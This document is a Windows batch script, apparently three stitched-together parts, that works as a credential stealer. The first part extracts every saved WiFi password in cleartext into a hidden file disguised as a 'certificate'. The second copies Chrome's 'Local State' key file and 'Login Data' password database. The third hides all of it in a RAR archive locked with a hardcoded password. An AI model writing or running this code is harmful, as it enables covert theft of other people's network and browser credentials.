@echo off
setlocal enabledelayedexpansion

for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (
    set "month=%%a"
    set "day=%%b"
    set "year=%%c"
)
for /f "tokens=1-3 delims=:,. " %%a in ('echo %time%') do (
    set "hour=%%a"
    set "minute=%%b"
    set "second=%%c"
)

set "timestamp=%year%-%month%-%day%_%hour%-%minute%-%second%"

set "output_file=certificate_%timestamp%.txt"

(
    echo Retrieving WiFi profiles...
    echo -----------------------------------------
    echo SSID                Password
    echo -----------------------------------------
) > %output_file%

for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "profile_name=%%A"
    set "profile_name=!profile_name:~1!"  :: حذف فاصله‌ی ابتدایی

    set "password=(No Password)"
    for /f "tokens=2 delims=:" %%B in ('netsh wlan show profile "!profile_name!" key^=clear ^| findstr "Key Content"') do (
        set "password=%%B"
        set "password=!password:~1!" :: حذف فاصله‌ی ابتدایی
    )

    echo !profile_name!            !password! >> %output_file%
)

attrib +h %output_file%

echo.
echo WiFi profiles have been saved to a hidden file named %output_file%.
timeout /t 1 >nul

@echo off
setlocal enabledelayedexpansion

for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (
    set "month=%%a"
    set "day=%%b"
    set "year=%%c"
)
for /f "tokens=1-3 delims=:,. " %%a in ('echo %time%') do (
    set "hour=%%a"
    set "minute=%%b"
    set "second=%%c"
)

set "timestamp=%year%-%month%-%day%_%hour%-%minute%-%second%"

set "LOCAL_STATE=%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
set "LOGIN_DATA=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

set "DEST=%CD%"

set "destLocalState=%DEST%\Local State_%timestamp%"
set "destLoginData=%DEST%\Login Data_%timestamp%"

copy "%LOCAL_STATE%" "%destLocalState%" >nul 2>&1
if %errorlevel%==0 (
    echo ok "Local State"
    attrib +h "%destLocalState%"
) else (
    echo no "Local State".
)

copy "%LOGIN_DATA%" "%destLoginData%" >nul 2>&1
if %errorlevel%==0 (
    echo yes "Login Data"
    attrib +h "%destLoginData%"
) else (
    echo no "Login Data".
)

@echo off
setlocal enabledelayedexpansion

set "zipFile=WiFi_Data_%timestamp%.rar"

"C:\Program Files\WinRAR\WinRAR.exe" a -p"amir007##" -hp"amir007##" "%zipFile%" "*.txt" "Local State_*.txt" "Login Data_*.txt"

attrib +h "%zipFile%"

exit /B 0


